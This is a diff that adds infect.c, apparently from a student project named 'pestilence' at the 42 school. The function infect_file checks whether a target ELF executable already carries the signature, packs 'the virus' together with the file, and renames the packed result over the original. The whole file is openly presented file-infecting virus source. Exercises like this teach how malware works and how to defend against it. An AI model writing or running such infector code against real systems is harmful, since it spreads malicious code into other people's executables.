@@ -1,0 +1,45 @@
+/* ************************************************************************** */
+/*                                                                            */
+/*                                                        :::      ::::::::   */
+/*   infect.c                                           :+:      :+:    :+:   */
+/*                                                    +:+ +:+         +:+     */
+/*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
+/*                                                +#+#+#+#+#+   +#+           */
+/*   Created: 2026/03/04 11:29:15 by mbatty            #+#    #+#             */
+/*   Updated: 2026/05/26 03:33:50 by pboucher         ###   ########.fr       */
+/*                                                                            */
+/* ************************************************************************** */
+
+#include "pestilence.h"
+
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+/*
+	Infects file given by path, it packs the virus and file together
+
+	@param ctx context used to check if file isnt already infected
+	@param path path to targeted executable
+*/
+int	infect_file(t_exec_ctx *ctx, const char *path)
+{
+	if (check_signature(path) == -1
+		|| check_elf_hdr(path) == -1)
+		return (0);
+
+	int	fd = open(path, O_WRONLY | O_APPEND);
+	if (fd == -1)
+		return (-1);
+
+	char	*tmp_path = strjoin(path, ".tmp");
+
+	pack_payload(ctx->exec_path, path, tmp_path);
+	rename(tmp_path, path);
+
+	free(tmp_path);
+
+	close(fd);
+	return (0);
+}
